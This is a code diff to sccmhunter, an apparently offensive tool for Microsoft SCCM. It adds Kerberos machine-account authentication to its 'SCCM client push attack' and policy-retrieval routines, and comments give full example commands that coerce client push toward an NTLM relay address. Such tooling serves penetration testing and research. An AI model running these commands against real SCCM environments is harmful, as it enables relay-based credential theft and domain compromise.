@@ -22,6 +22,7 @@ class HTTP:
     def __init__(self, username=None, password=None, domain=None, target_dom=None,
                     dc_ip=None,ldaps=False, channel_binding=False, signing=False, kerberos=False, no_pass=False, hashes=None,
                     aes=None, debug=False, auto=False, computer_pass=None, computer_hash=None,computer_name=None,
+                    computer_kerberos=False, computer_aes=None,
                     uuid=None, mp=None, sp=False, spcn=None, sppid=None, spanon=False, altauth=False, sleep=None, logs_dir=None):
         self.username = username
         self.password = password
@@ -42,6 +43,8 @@ class HTTP:
         self.computer_name = computer_name
         self.computer_hash = computer_hash
         self.computer_pass = computer_pass
+        self.computer_kerberos = computer_kerberos
+        self.computer_aes = computer_aes
         self.uuid = uuid
         self.mp = mp
         self.sp = sp
@@ -122,6 +125,9 @@ class HTTP:
 #       python3 sccmhunter.py http  -mp <target> -u '<username>' -p <password> -sleep 3 -sp  -spcn '<ntlm_relay_IP>' -dc-ip <DC_IP> -d <DOMAIN>
 # C. Unauthenticated registration => unapproved client but still triggers the sccm push (may not work in certain cases) (actually very efficient during tests)
 #        python3 sccmhunter.py http  -mp <target> -sleep 10 -sp  -spcn '<ntlm_relay_IP>' -dc-ip <DC_IP> -d <DOMAIN> -sppid 'Microsoft Windows NT Server 10.0' --sccm-push-anonymous
+# D. with a machine account authenticated over Kerberos (required since NTLM is rejected on the MP in SCCM 2509, or when the machine account is denied network NTLM logon):
+#       KRB5CCNAME=/tmp/<machine>.ccache python3 sccmhunter.py http -mp <target> -cn '<machine>$' -ck -no-pass -dc-ip <DC_IP> -d <DOMAIN>
+#       (or request the ticket in-line: python3 sccmhunter.py http -mp <target> -cn '<machine>$' -ck -caes <aes_key> -dc-ip <DC_IP> -d <DOMAIN>)
     def sccm_push(self):
         logger.info(f"[*] Performing SCCM client push attack")
         key = None
@@ -129,6 +135,8 @@ class HTTP:
             logger.info(f"Detected uuid, trying to reuse alreday created client with uuid: {self.uuid}, \n[!] probably wont work since client needs to be not installed to trigger sccm push... ")
             with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
                 key = serialization.load_pem_private_key(g.read(), password=b"mimikatz")
+        elif (self.computer_kerberos and self.computer_name):
+            logger.info(f"Detected Kerberos machine authentication, reusing existing computer {self.computer_name} to enroll a new client !")
         elif (self.computer_name and (self.computer_pass or self.computer_hash)) :
             logger.info(f"Detected provided computer name and credentials, trying to reuse already existing computer to enroll a new client !")
             if not self.computer_pass:
@@ -164,10 +172,12 @@ class HTTP:
                 sys.exit()
         
         target_fqdn = f'{self.spcn.upper()}'
-        sccmwtf = SCCMTools(target_name=self.spcn, target_fqdn=target_fqdn, 
-                            target_sccm=self.mp,target_username=self.username, 
-                            target_password=self.password, sleep=self.sleep, 
-                            logs_dir=self.logs_dir,sp=self.sp,altauth=self.altauth, plid=self.sppid)
+        sccmwtf = SCCMTools(target_name=self.spcn, target_fqdn=target_fqdn,
+                            target_sccm=self.mp,target_username=self.username,
+                            target_password=self.password, sleep=self.sleep,
+                            logs_dir=self.logs_dir,sp=self.sp,altauth=self.altauth, plid=self.sppid,
+                            kerberos=self.computer_kerberos, dc_ip=self.dc_ip, computer_hash=self.computer_hash,
+                            computer_aes=self.computer_aes, domain=self.domain)
         try:
             uuid = self.uuid
             if not uuid:
@@ -200,10 +210,14 @@ class HTTP:
             else:
                 logger.info(f'[-] Could not validate successful creation.')
 
-        if self.computer_name and self.computer_hash and not self.computer_pass:
+        if self.computer_name and self.computer_hash and not self.computer_pass and not self.computer_kerberos:
             self.computer_pass = '0'*32 + ':' + self.computer_hash
 
-        if not (self.computer_name or self.computer_pass):
+        if self.computer_kerberos:
+            if not self.computer_name:
+                logger.info("[-] Kerberos machine authentication requires the machine account name (-cn).")
+                sys.exit()
+        elif not (self.computer_name or self.computer_pass):
             logger.info("[-] Missing machine account credentials, check your arguments and try again.")
             sys.exit()
 
@@ -216,7 +230,9 @@ class HTTP:
             target_fqdn = f'{target_name}.{self.domain}'
             try:
                 logger.info(f"[*] Attempting to grab policy from {target}")
-                SCCMWTF=SCCMTools(target_name, target_fqdn, target, self.computer_name, self.computer_pass, self.sleep, self.logs_dir)
+                SCCMWTF=SCCMTools(target_name, target_fqdn, target, self.computer_name, self.computer_pass, self.sleep, self.logs_dir,
+                                  kerberos=self.computer_kerberos, dc_ip=self.dc_ip, computer_hash=self.computer_hash, computer_aes=self.computer_aes,
+                                  domain=self.domain)
                 SCCMWTF.sccmwtf_run()
             except Exception as e:
                 logger.info(e)
